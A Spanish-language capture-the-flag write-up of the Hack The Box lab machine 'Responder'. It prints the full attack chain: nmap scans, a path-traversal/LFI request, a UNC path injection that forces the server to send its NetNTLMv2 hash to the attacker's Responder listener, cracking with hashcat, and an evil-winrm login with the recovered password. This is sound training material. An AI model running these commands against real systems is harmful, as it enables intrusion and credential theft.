@@ -1,0 +1,275 @@
+---
+type: writeup
+title: Responder
+description: Se centra en explorar la vulnerabilidad de inclusión de archivos en una aplicación web y cómo aprovecharla para obtener el challenge NetNTLMv2 del usuario que ejecuta el servidor web. La máquina muestra la utilidad Responder y la herramienta de descifrado de hashes John The Ripper para obtener una contraseña en texto plano a partir de un hash NTLM. Finalmente, la herramienta Evil-WinRM permite acceder a una terminal en la máquina utilizando las credenciales obtenidas.
+lang: es
+draft: false
+image: ../../../../images/writeups/hackthebox/machines/responder/responder.png
+platform: hackthebox
+url: https://app.hackthebox.com/machines/Responder
+difficulty: veryeasy
+os: windows
+hints: []
+tags: []
+---
+
+## Enumeration
+
+Escaneamos con `nmap` todos los puertos para ver cuáles están abiertos y qué servicios corren en ellos.
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/allports 10.129.124.108
+```
+
+```plaintext
+PORT     STATE SERVICE   REASON
+80/tcp   open  http      syn-ack ttl 127
+5985/tcp open  wsman     syn-ack ttl 127
+7680/tcp open  pando-pub syn-ack ttl 127
+```
+
+Escaneamos los puertos abiertos para conocer más detalles de los servicios que corren en ellos.
+
+```bash
+nmap -p 80,5985,7680 -sCV -oA nmap/openports 10.129.124.108
+```
+
+```plaintext
+PORT     STATE    SERVICE   VERSION
+80/tcp   open     http      Apache httpd 2.4.52 (OpenSSL/1.1.1m PHP/8.1.1)
+|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+5985/tcp open     http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+7680/tcp filtered pando-pub
+Service Info: Host: unika.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+El output de `nmap` nos muestra el dominio `unika.htb` y al visitar el sitio web en el puerto 80 nos redirecciona al mismo dominio y como este no está registrado en ningún DNS público necesitamos indicarle al archivo `/etc/hosts`, que el navegador consulta, para decirle que el dominio pertenece a la ip.
+
+```bash
+sudo nvim /etc/hosts
+```
+
+Agregamos `10.129.124.108 unika.htb` y guardamos. También podemos ejecutar el comando `echo "10.129.124.108 unika.htb" | sudo tee -a /etc/hosts` para hacer lo mismo sin entrar a editar el archivo.
+
+## Exploitation
+
+La web tiene una opción para cambiar de idioma, el parámetro de consulta (query parameter) `page` recibe como valor un archivo `html`. Probamos si podemos leer archivos del sistema por medio de un path traversal. Usamos `curl`.
+
+```bash
+curl http://unika.htb/index.php?page=../../../../windows/system32/drivers/etc/hosts
+```
+
+```plaintext
+# Copyright (c) 1993-2009 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+# This file contains the mappings of IP addresses to host names. Each
+# entry should be kept on an individual line. The IP address should
+# be placed in the first column followed by the corresponding host name.
+# The IP address and the host name should be separated by at least one
+# space.
+#
+# Additionally, comments (such as these) may be inserted on individual
+# lines or following the machine name denoted by a '#' symbol.
+#
+# For example:
+#
+#      102.54.94.97     rhino.acme.com          # source server
+#       38.25.63.10     x.acme.com              # x client host
+
+# localhost name resolution is handled within DNS itself.
+#	127.0.0.1       localhost
+#	::1             localhost
+```
+
+Si intentamos leer archivos `.php` el servidor los va a ejecutar ya que utiliza la función `include`. Para extraer el contenido de archivos `.php` o configuraciones sin que el servidor los ejecute, se utilizan PHP Wrappers para codificarlos en Base64. Utilizamos la terminal para obtener el archivo en base64 y pipearlo para decodificar y obtener el contenido.
+
+Windows utiliza el protocolo `NTLM` para la autenticación en redes locales. Como la aplicación web es vulnerable a LFI podemos ver si ingresando una ruta `UNC` (Universal Naming Convention, rutas de red que empiezan con `\\`, para recursos compartidos), se puede obligar al usuario del servidor intentar conectarse a nuestra máquina y obtener el hash NTLMv2 con [Responder](https://github.com/lgandx/Responder).
+
+El servidor Windows intenta buscar un archivo en una ruta de red que controlamos (usando una ruta UNC como `\\IP-ATACANTE\archivo.txt`), el sistema operativo del servidor se va a intentar conectar a nuestra IP pensando que es un servidor de archivos legítimo. Con `Responder` corriendo en nuestra máquina, la herramienta va a detectar esa conexión entrante y va a simular ser un servidor de Windows válido, va a forzar el protocolo de autenticación preguntadole quién es (Windows, por su diseño interno, envía automáticamente las credenciales de la cuenta que está ejecutando el servicio web en forma de Hash NTLMv2) y va a interceptar ese hash mostrandolo en pantalla.
+
+Clonamos `Responder`, creamos un entorno virtual,lo activamos e instalamos las librerías que la herramienta necesita.
+
+```bash
+git clone https://github.com/lgandx/Responder.git
+cd Responder
+python3 -m venv venv
+source venv/bin/activate
+pip3 install -r requirements.txt
+```
+
+Ejecutamos `Responder` y le pasamos la ruta de `python` del entorno virtual para evitar conflictos con instalaciones de librerías en el sistema.
+
+```bash
+sudo venv/bin/python3 Responder.py -I tun0 -v
+```
+
+```plaintext
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+
+[*] Tips jar:
+    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
+    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+    DHCPv6                     [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    MQTT server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.15.78]
+    Responder IPv6             [fe80::4ed4:a108:fd36:ef4e]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
+    Don't Respond To MDNS TLD  ['_DOSVC']
+    TTL for poisoned response  [default]
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-85H4W7MYL5R]
+    Responder Domain Name      [7M61.LOCAL]
+    Responder DCE-RPC Port     [49678]
+
+[*] Version: Responder 3.2.2.0
+[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
+
+[+] Listening for events...
+```
+
+Intentamos leer un archivo de nuestra máquina pasandole una ruta UNC aprovechando el path traversal.
+
+```bash
+curl -s http://unika.htb/index.php?page=\\10.10.15.78\melvin.txt
+```
+
+Obtenemos el hash de la cuenta `Administrator`.
+
+```plaintext
+[SNMP] Warning: pyasn1 not installed, SNMP server disabled
+[SMB] NTLMv2-SSP Client   : 10.129.124.108
+[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
+[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:21fab90d9aa4eaaf:FD0DCFD6FA102FCB81FB244D1143C2B1:010100000000000000AC98B35A1EDD01AFAF307049269494000000000200080037004D003600310001001E00570049004E002D003800350048003400570037004D0059004C003500520004003400570049004E002D003800350048003400570037004D0059004C00350052002E0037004D00360031002E004C004F00430041004C000300140037004D00360031002E004C004F00430041004C000500140037004D00360031002E004C004F00430041004C000700080000AC98B35A1EDD01060004000200000008003000300000000000000001000000002000009C71B00BAE06386463AF39D945CA4F1BD7AE46B79F726FC5E51F35EC3C3D514C0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00370038000000000000000000
+```
+
+Buscamos el tipo de modo que necesitamos usar con hashcat para obtener la contraseña en texto plano.
+
+```bash
+hashcat --identify administrator.hash
+```
+
+```plaintext
+The following hash-mode match the structure of your input hash:
+
+      # | Name                                                       | Category
+  ======+============================================================+======================================
+   5600 | NetNTLMv2                                                  | Network Protocol
+```
+
+Crackeamos el hash y obtenemos la contraseña en texto plano.
+
+```bash
+hashcat -m 5600 administrator.hash /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
+```
+
+```plaintext
+ADMINISTRATOR::RESPONDER:21fab90d9aa4eaaf:fd0dcfd6fa102fcb81fb244d1143c2b1:010100000000000000ac98b35a1edd01afaf307049269494000000000200080037004d003600310001001e00570049004e002d003800350048003400570037004d0059004c003500520004003400570049004e002d003800350048003400570037004d0059004c00350052002e0037004d00360031002e004c004f00430041004c000300140037004d00360031002e004c004f00430041004c000500140037004d00360031002e004c004f00430041004c000700080000ac98b35a1edd01060004000200000008003000300000000000000001000000002000009c71b00bae06386463af39d945ca4f1bd7ae46b79f726fc5e51f35ec3c3d514c0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00370038000000000000000000:badminton
+```
+
+Nos conectamos al servidor con las credenciales obtenidas.
+
+```bash
+evil-winrm -i 10.129.124.108 -u administrator -p badminton
+```
+
+Buscamos la flag en el escritorio del usuario administrator pero no la encontramos.
+
+```bash
+dir ..\Desktop
+```
+
+Miramos que otros usuarios hay en el sistema.
+
+```bash
+net users
+```
+
+```plaintext
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest
+mike                     WDAGUtilityAccount
+The command completed with one or more errors.
+```
+
+Listamos los archivos del escritorio del usuario `mike`.
+
+```bash
+dir C:\Users\mike\Desktop
+```
+
+```plaintext
+    Directory: C:\Users\mike\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         3/10/2022   4:50 AM             32 flag.txt
+```
+
+Leemos la flag.
+
+```bash
+type C:\Users\mike\Desktop\flag.txt
+```
+
+### Flag
+
+<Callout type="success" title="Flag">
+e******************************c
+</Callout>
